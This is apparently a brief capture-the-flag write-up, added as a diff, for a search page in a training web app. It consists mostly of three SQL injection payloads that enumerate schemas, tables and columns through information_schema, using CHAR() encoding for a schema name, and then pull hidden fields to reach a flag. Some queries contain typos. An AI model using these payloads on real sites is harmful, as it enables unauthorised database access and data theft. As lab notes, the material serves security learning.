@@ -1,0 +1,6 @@
+Searchimg page:
+Again SQL INjections: we need find table_schema Member_images -> table_name: list_images -> column_name
+SQL Inkection:
+	1) 1 and 1=2 union select table_schema, table_name from information_schema.tables; -- we take all db names and tables names
+	2) 1 and 1=2 union select table_name, column_name from information_scheam.columns where table_scheam=CHAR(77, 101, 109, 98, 101, 114, 95, 105, 109, 97, 103, 101, 115); -- we take all columns in db Member_images
+	3) 1 union select comment, title from list_images; output hidden feilds for search informations, next we see comment: title=Hack me?, comment looks like -> "Take this, decode, and u find flag ;)"
